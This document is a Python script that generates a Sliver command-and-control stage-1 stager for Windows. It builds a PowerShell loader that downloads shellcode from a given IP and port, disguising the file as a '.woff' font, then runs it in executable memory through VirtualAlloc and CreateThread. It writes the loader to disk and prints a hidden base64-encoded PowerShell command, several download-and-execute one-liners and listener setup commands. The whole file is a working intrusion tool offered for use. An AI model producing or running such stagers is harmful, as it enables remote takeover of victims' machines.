import sys
import base64
import os

def help():
   print("USAGE: %s IP PORT" % sys.argv[0])
   print("Returns sliver stage1 Powershell base64 encoded cmdline payload connecting to IP:PORT")
   exit()

try:
   ip = sys.argv[1]
   port = str(sys.argv[2])
except:
   help()

buf = '$Win32 = @"\n'
buf += 'using System;\n'
buf += 'using System.Runtime.InteropServices;\n'
buf += 'public class Win32 {\n'
buf += '[DllImport("kernel32")]\n'
buf += 'public static extern IntPtr VirtualAlloc(IntPtr lpAddress,\n'
buf += '    uint dwSize,\n'
buf += '    uint flAllocationType,\n'
buf += '    uint flProtect);\n'
buf += '[DllImport("kernel32", CharSet=CharSet.Ansi)]\n'
buf += 'public static extern IntPtr CreateThread(\n'
buf += '    IntPtr lpThreadAttributes,\n'
buf += '    uint dwStackSize,\n'
buf += '    IntPtr lpStartAddress,\n'
buf += '    IntPtr lpParameter,  \n'
buf += '    uint dwCreationFlags,\n'
buf += '    IntPtr lpThreadId);\n'
buf += '[DllImport("kernel32.dll", SetLastError=true)]  \n'
buf += 'public static extern UInt32 WaitForSingleObject(\n'
buf += '    IntPtr hHandle,\n'
buf += '    UInt32 dwMilliseconds);\n'
buf += '} \n'
buf += '"@\n'
buf += 'Add-Type $Win32\n'
buf += '\n'
buf += '$shellcode = (New-Object System.Net.WebCLient).DownloadData("http://'+ip+':'+port+'/l4rry.woff")\n'
buf += 'if ($shellcode -eq $null) {Exit};\n'
buf += '$size = $shellcode.Length\n'
buf += '\n'
buf += '[IntPtr]$addr = [Win32]::VirtualAlloc(0,$size,0x1000,0x40); \n'
buf += '[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)\n'
buf += '$thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);\n'
buf += '[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")\n'

payload = buf

#payload = payload % (ip, port)

#write to file Sliver.ps1
file = open ("Sliver.ps1","w")
file.write (payload)
file.close

itemlist = os.listdir()
cwd = os.getcwd()

base64cmd = "powershell.exe -nop -w hidden -Enc " + base64.b64encode(payload.encode('utf16')[2:]).decode()
echocmd = 'echo IEX(New-Object Net.WebClient).DownloadString("http://'+ip+':8080/Sliver.ps1") | powershell -noprofile -'
echocmd2 = 'C:\Windows\System32\cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString("http://'+ip+':8080/Sliver.ps1") | powershell -noprofile -'
iwr = 'powershell.exe iwr -UseBasicParsing http://'+ip+':8080/Sliver.ps1 -Outfile %TMP%\Sliver.ps1; %TMP%\Sliver.ps1'
iwr2 = 'C:\Windows\System32\cmd.exe /c powershell.exe iwr -UseBasicParsing http://'+ip+':8080/Sliver.ps1 -Outfile %TMP%\Sliver.ps1; %TMP%\Sliver.ps1'

# Color Coding

CRED = '\033[91m'
CGREEN = '\033[92m'
CPURPLE = '\033[95m'
CEND = '\033[0m'

print ("\n")
print ("███████╗██╗     ██╗██╗   ██╗███████╗██████╗     ██████╗ ███████╗    ███████╗████████╗ █████╗  ██████╗ ███████╗ ██╗")
print ("██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔══██╗██╔════╝    ██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔════╝███║")
print ("███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ██████╔╝███████╗    ███████╗   ██║   ███████║██║  ███╗█████╗  ╚██║")
print ("╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██╔═══╝ ╚════██║    ╚════██║   ██║   ██╔══██║██║   ██║██╔══╝   ██║")
print ("███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ██║     ███████║    ███████║   ██║   ██║  ██║╚██████╔╝███████╗ ██║")
print ("╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝    ╚═╝     ╚══════╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═╝")
print ("\n")

print (CRED + "==== Sliver Stager Setup ====\n" + CEND)
print ("profiles new --mtls "+ip+" --format shellcode win64")
print ("")
print ("stage-listener --url http://"+ip+":"+port+" --profile win64")
print ("")
print (CRED + "==== Sliver.ps1 Script Staging ====\n" + CEND)
print (CGREEN + "#> Sliver.ps1 was wrote to CWD\n" + CEND)
if 'Sliver.ps1' in itemlist:
    print (cwd + "/Sliver.ps1\n")
print (CGREEN + "#> Host a webserver\n" + CEND)
print (" python3 -m http.server 8080 ")
print ("")
print (CRED + "=== PS BASE64 Encoded Command ====\n" + CEND)
print (base64cmd)
print ("")
print (CRED + "==== ECHO CMD Stager via webserver 8080 ====\n" + CEND)
print (echocmd)
print ("")
print (echocmd2)
print ("")
print (CRED + "==== IWR Sliver.ps1 Download to Disk via webserver 8080 !OSPEC ====\n" + CEND)
print (iwr)
print ("")
print (iwr2)
print ("")
print (CPURPLE + "Bred as living shields, these slivers have proven unruly—they know they cannot be caught." + CEND)
